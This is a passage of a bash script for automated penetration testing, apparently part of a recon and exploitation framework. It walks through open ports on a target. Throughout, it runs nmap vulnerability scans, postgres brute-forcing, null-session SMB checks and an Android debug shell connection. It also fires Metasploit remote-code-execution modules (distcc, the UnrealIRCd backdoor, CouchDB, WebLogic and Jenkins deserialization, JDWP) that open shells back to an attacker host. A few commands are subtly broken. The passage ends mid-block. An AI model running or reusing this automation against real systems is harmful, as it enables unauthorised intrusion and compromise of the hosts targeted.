  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw 2> /dev/null
  fi
fi

if [[ -z "$port_1433" ]];
then
  echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=ms-sql*,/usr/share/nmap/scripts/vulners -p 1433 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1433.txt
  fi
fi

if [[ -z "$port_2049" ]];
then
  echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=nfs*,/usr/share/nmap/scripts/vulners -p 2049 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port2049.txt
  fi
  if [[ "$RPC_INFO" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    rpcinfo -p $TARGET
  fi
  if [[ "$SHOW_MOUNT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SHOWMOUNT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    showmount -e $TARGET
  fi
  if [[ "$SMB_ENUM" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED CHECKING FOR NULL SHARES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    smbclient -L $TARGET -U " "%" " 
  fi
fi

if [[ -z "$port_2181" ]];
then
  echo -e "$OKRED + -- --=[Port 2181 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 2181 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED RUNNING ZOOKEEPER RCE EXPLOIT $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo stat | nc $TARGET 2181 | tee $LOOT_DIR/output/zookeeper-$TARGET-port2181.txt
fi

if [[ -z "$port_3306" ]];
then
  echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=mysql*,/usr/share/nmap/scripts/vulners -p 3306 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3306.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS "$TARGET"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw > $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw 2> /dev/null
  fi
fi

if [[ -z "$port_3310" ]];
then
  echo -e "$OKRED + -- --=[Port 3310 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3310 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    nmap -A -p 3310 -Pn -sV  -v --script-timeout 90 --script=clamav-exec,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3310.txt
  fi
fi

if [[ -z "$port_3128" ]];
then
  echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -p 3128 -Pn -sV  -v --script-timeout 90 --script=*proxy*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3128.txt
  fi
fi

if [[ -z "$port_3389" ]];
then
  echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=rdp-*,/usr/share/nmap/scripts/vulners -p 3389 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3389.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw > $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING KEEPBLUE CVE-2019-0708 RCE SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use scanner/rdp/cve_2019_0708_bluekeep; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389-cve_2019_0708_bluekeep.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3389-cve_2019_0708_bluekeep.raw > $LOOT_DIR/output/msf-$TARGET-port3389-cve_2019_0708_bluekeep.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3389-cve_2019_0708_bluekeep.raw 2> /dev/null
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED RUNNING RDESKTOP CONNECTION $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  rdesktop $TARGET &
fi

if [[ -z "$port_3632" ]];
then
  echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=distcc-*,/usr/share/nmap/scripts/vulners -p 3632 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3632.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use unix/misc/distcc_exec; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw > $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw 2> /dev/null
  fi
fi

if [[ -z "$port_5432" ]];
then
  echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=pgsql-brute,/usr/share/nmap/scripts/vulners -p 5432 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5432.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw > $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw 2> /dev/null
  fi
fi

if [[ -z "$port_5555" ]];
then
  echo -e "$OKRED + -- --=[Port 5555 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5555 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED CONNECTING TO ANDROID DEBUG SHELL $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  adb connect $TARGET:5555
  adb shell pm list packages 
fi

if [[ -z "$port_5800" ]];
then
  echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=vnc*,/usr/share/nmap/scripts/vulners -p 5800 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5800.txt
  fi
fi

if [[ -z "$port_5900" ]];
then
  echo -e "$OKRED + -- --=[Port 5900 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5900 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV  -v --script-timeout 90 --script=vnc*,/usr/share/nmap/scripts/vulners -p 5900 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5900.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw > $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw 2> /dev/null
  fi
fi

if [[ -z "$port_5984" ]];
then
  echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=couchdb*,/usr/share/nmap/scripts/vulners -p 5984 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5984.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw > $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING APACHE COUCHDB RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS "$TARGET"; set RPORT 5984; setg LHOST $MSF_LHOST; setg $MSF_LPORT; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.raw > $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.raw 2> /dev/null
  fi
fi

if [[ -z "$port_6000" ]];
then
  echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=x11*,/usr/share/nmap/scripts/vulners -p 6000 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6000.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" | tee $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw > $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw 2> /dev/null
  fi
fi

if [[ -z "$port_6667" ]];
then
  echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=irc*,/usr/share/nmap/scripts/vulners -p 6667 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6667.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw 2> /dev/null
  fi
fi

if [[ -z "$port_7001" ]];
then
  echo -e "$OKRED + -- --=[Port 7001 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 7001 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -sV -p 7001 -v --script-timeout 90 --script=weblogic-t3-info.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port7001.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
    msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw 2> /dev/null
  fi
fi

if [[ -z "$port_8000" ]];
then
  echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING JAVA JDWP DEBUG EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use exploit/multi/misc/java_jdwp_debugger; setg RHOSTS "$TARGET"; set RPORT 8000; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw > $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw 2> /dev/null
  fi
fi

if [[ -z "$port_8001" ]];
then
  echo -e "$OKRED + -- --=[Port 8001 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8001 opened... running tests...$RESET"
  if [[ "$AMAP" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING AMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    amap $TARGET 8001 -A
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -p 8001 -v --script-timeout 90 --script=rmi-*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port8001.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
